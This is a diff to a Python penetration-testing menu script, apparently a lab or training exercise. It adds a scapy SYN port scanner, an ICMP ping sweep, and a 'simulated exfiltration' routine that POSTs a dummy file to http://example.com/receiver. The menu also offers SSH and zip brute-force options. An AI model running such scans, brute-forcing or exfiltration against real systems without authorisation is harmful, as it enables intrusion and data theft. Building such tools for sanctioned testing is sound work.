@@ -13,10 +13,15 @@
 #!/usr/bin/python3
 
 import getpass, gzip, os, paramiko, re, shutil, sys, tarfile, time, wget
+from ipaddress import ip_network
+from scapy.all import IP, ICMP, TCP, sr1, send, RandShort
 from zipfile import ZipFile
 
 
+####################### 
+##### FUNCTIONS #######
 #######################
+
 # open function to get host IP from user
 def getHost():
     # make host a global variable
@@ -380,22 +385,278 @@ def execZip():
                 sys.exit()
 
 #######################
-                
+# open function to get target IP address for TCP Port scan  
+def getTgt1():
+    # get user input
+    target = input("enter the destination IP address for TCP scan: ")
+    print("\ngot it, looking at",target,"\n")
+    # spit out IP addr
+    return target
 
+# open identical function to get target CIDR for ICMP scan / enumeration
+def getTgt2():
+    # get user input
+    target = input("enter the destination IP address and cidr for ICMP sweep: ")
+    print("\ngot it, looking at",target,"\n")
+    # spit out CIDR
+    return target
 
 #######################
+# get target ports from user as list
 
+def getPort():
+    # declare empty list
+    portList = []
+    # take user input 1
+    ports = input("enter a port of interest for the target host(s): ")
+    print("\ngot it, looking at",ports,"\n")
+    # add input 1 to list
+    portList.append(ports)
+
+    # ask for additional inputs?
+    morePorts = input("do you want to add another port? y/n ")
+    # if more inputs
+    if morePorts == 'y':
+        while True:
+            # then get those inputs too
+            ports = input("\nenter another port of interest: ['q' to break]\n")
+            # until escape
+            if ports == 'q':
+                break
+            print("got it, looking at",ports,"\n")
+            # and keep adding them to the list
+            portList.append(ports)
+        
+    return portList
 
 #######################
-                
+# open function to send tcp packets to identified targets
+def portTester(target, portList):
+    
+    # declare empty result list
+    results = []
+    
+    # iterate through ports
+    for p in portList:
+        
+        # readability
+        host = target
+        dstPort = p
+
+        # Generate a random source port
+        srcPort = int(RandShort())
+
+        # define response var as the output from sending sr1 (tcp packet to target)
+        response = sr1(IP(dst=host)/TCP(sport=int(srcPort), dport=int(dstPort), flags='S'), timeout=1, verbose=0)
+        
+        if response:
+
+            # extract flags from the received packet
+            flags = response.getlayer(TCP).flags
+
+            # check for SYN-ACK
+            if flags & 0x12:
+                print(f"\nReceived a SYN-ACK from {target} on port {dstPort} - the port is OPEN. Sending a RST to close.")
+
+                # send a RST packet to close the connection
+                send(IP(dst=host)/TCP(sport=int(srcPort), dport=int(dstPort), flags='R'), verbose=0)
+
+                results.append((dstPort, 'Open'))
+
+            # check for RST-ACK
+            elif flags & 0x14:
+                print(f"Received a RST-ACK from {target} on port {dstPort} - the port is CLOSED.")
+
+                results.append((dstPort, 'Closed'))
+
+        else:
+            print(f"No response received from {target} on port {dstPort} - the port is FILTERED or the packet was DROPPED.")
+
+            results.append((dstPort, 'Filtered/Dropped'))
+    
+    return results  
 
 #######################
+# open a function to call the others and actually execute tcp scan
+def tcp_port_scan():
+    print("\n\nTCP Port Scan\n\n")
+
+    target = getTgt1()
+    portList = getPort()
+
+    print("\n##########\nTARGETING:\n",target,"\nON PORTS:\n",portList,"\n##########\n")
+
+    test = portTester(target,portList)
+    print("\nRESULTS:\n")
+    print(test)
+
+#######################
+# open a function to conduct icmp sweep (enumeration)
+def icmp_ping_sweep():
+    print("\n\nICMP Ping Sweep\n\n")
+
+    # get the cidr from user
+    netCidr = getTgt2()
+
+    # calculate the possible ip range from the cidr
+    targets = ip_network(netCidr)
+
+    # set var to null
+    hostReplies = 0
+    hostList = []
+
+    # iterate through possible ips
+    for host in targets.hosts():
+
+        # set ping var as outgoing icmp for given ip addr
+        ping = IP(dst=str(host))/ICMP()
+
+        # and set reply var with sr1 (variable in a variable)
+        reply = sr1(ping, timeout=1, verbose=0)
+
+        # interpret results
+        if reply is None:
+            print(f"{host} is down or not responding.")
+        elif reply.haslayer(ICMP):
+            if int(reply.getlayer(ICMP).type) == 3 and int(reply.getlayer(ICMP).code) in [1, 2, 3, 9, 10, 13]:
+                print(f"{host} is actively blocking ICMP traffic.")
+            else:
+                print(f"{host} is active.")
                 
+                # increase up count by 1
+                hostReplies += 1
+                # add ip address to list
+                hostList.append(host)
+        else:
+            print(f"{host} is active.")
+            
+            # increase up count by 1
+            hostReplies += 1
+            # add ip address to list
+            hostList.append(host)
+
+    print(f"\nNumber of active hosts: {hostReplies}")
+    
+    return hostList
+
+#######################
+# follow-on action after ping sweep - tcp port scan of up hosts
+def scan_up_hosts(hostList):
+    portList = getPort()
+
+    for host in hostList:
+        new_host = str(host)
+        print(f"\n##########\nTARGETING:\n  {host}\nON PORTS:\n  {portList}\n##########\n")
+
+        test = portTester(new_host, portList)
+        print("\nRESULTS for host", host, ":\n")
+        print(test)
+
+
+
+
+
+import requests  # For making HTTP requests to simulate data exfiltration
+import os        # For file operations
+import json      # For JSON operations if needed
+
+def simulated_exfiltration():
+    print("Simulated Exfiltration Attempt starting...")
+    
+    # Your exfiltration simulation code will go here.
+    # For instance, you could create a dummy file and try to 'exfiltrate' it to an external server.
+
+    # Creating a dummy file with sensitive data simulation
+    with open('dummy_sensitive_data.txt', 'w') as file:
+        file.write('simulated sensitive content')
+
+    # Attempt to send the file to an external server
+    url = 'http://example.com/receiver'  # Replace with your receiving server URL
+    files = {'file': open('dummy_sensitive_data.txt', 'rb')}
+    
+    try:
+        response = requests.post(url, files=files)
+        print(f"File sent. Server response: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Exfiltration attempt failed: {e}")
+    
+    # Remember to remove the dummy file if necessary
+    os.remove('dummy_sensitive_data.txt')
+
+
+import subprocess  # For executing shell commands
+import sys         # For system-specific parameters and functions
+
+def anomaly_based_execution():
+    print("Anomaly-Based Script Execution starting...")
+    
+    # Your anomaly-based script execution code will go here.
+    # For instance, you could simulate executing a script that shouldn't typically run.
+
+    # Simulate executing a suspicious script
+    suspicious_script = 'suspicious_script.sh'  # Replace with your script's filename
+    
+    try:
+        result = subprocess.run(['sh', suspicious_script], capture_output=True, text=True)
+        print(f"Script executed with output: {result.stdout}")
+    except subprocess.CalledProcessError as e:
+        print(f"Script execution failed: {e.output}")
+    except FileNotFoundError:
+        print(f"Script {suspicious_script} not found.")
+
+
+
+
+
+
+
+
+
 ###########################################################################################################
 ###########################################################################################################
 
-def main_menu(): 
+import sys
+
+# Define other functions here (tcp_port_scan, icmp_ping_sweep, scan_up_hosts, execSSH, execZip, simulated_exfiltration, anomaly_based_execution)
+
+def main_menu():
+    hostList = []
     while True:
+        print("\n=== Penetration Testing Interactive Menu ===")
+        print("1 - TCP Port Scan")
+        print("2 - ICMP Ping Sweep")
+        print("3 - Port Scan Up_Hosts (run after #2)")
+        print("4 - SSH Attempt / Brute Force")
+        print("5 - Unlock Zip / Brute Force")
+        print("6 - Simulated Exfiltration Attempt")
+        print("7 - Anomaly-Based Script Execution")
+        print("8 - Quit - 'q' or 8")
+        
+        choice = input("Enter your choice: ")
+        
+        if choice == '1':
+            tcp_port_scan()
+        elif choice == '2':
+            hostList = icmp_ping_sweep()
+            print(hostList)
+        elif choice == '3':
+            if hostList:  # Ensure there is a list of hosts to scan
+                scan_up_hosts(hostList)
+            else:
+                print("No active host list available. Run ICMP Ping Sweep first.")
+        elif choice == '4':
+            execSSH()
+        elif choice == '5':
+            execZip()
+        elif choice == '6':
+            simulated_exfiltration()
+        elif choice == '7':
+            anomaly_based_execution()
+        elif choice == '8' or choice.lower() == 'q':
+            print("Exiting the program.")
+            sys.exit()
+        else:
+            print("Invalid input. Please enter a number between 1 and 8.")
 
 ###########################################################################################################
 
